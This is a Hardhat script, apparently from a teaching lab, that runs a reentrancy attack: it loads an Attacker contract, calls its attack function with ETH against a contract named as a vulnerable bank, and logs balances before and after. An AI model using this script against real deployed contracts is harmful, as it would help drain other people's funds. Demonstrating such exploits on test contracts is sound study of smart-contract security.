import "dotenv/config";
import "@nomicfoundation/hardhat-ethers";
import { network } from "hardhat";
import { checkBalances } from "./check-balances.js";

const VULNERABLE_BANK_ADDRESS = process.env.VULNERABLE_BANK_ADDRESS ?? "";
const ATTACKER_ADDRESS = process.env.ATTACKER_ADDRESS ?? "";

if (!VULNERABLE_BANK_ADDRESS || !ATTACKER_ADDRESS) {
  throw new Error("Set VULNERABLE_BANK_ADDRESS and ATTACKER_ADDRESS in .env");
}

const { ethers } = await network.create();
const [signer] = await ethers.getSigners();

const attacker = await ethers.getContractAt("Attacker", ATTACKER_ADDRESS);
const attackAmount = await attacker.ATTACK_AMOUNT();

console.log("══════════════════════════════════════════");
console.log("  BEFORE ATTACK");
await checkBalances(ethers, signer.address);

console.log(`Launching reentrancy attack...`);
console.log(`  Attacker contract : ${ATTACKER_ADDRESS}`);
console.log(`  Target bank       : ${VULNERABLE_BANK_ADDRESS}`);
console.log(`  Attack amount     : ${ethers.formatEther(attackAmount)} ETH\n`);

const tx = await attacker.attack({ value: attackAmount });
console.log(`  tx hash: ${tx.hash}`);
console.log(`  Waiting for confirmation...`);
await tx.wait();
console.log(`  Confirmed.\n`);

console.log("══════════════════════════════════════════");
console.log("  AFTER ATTACK");
await checkBalances(ethers, signer.address);
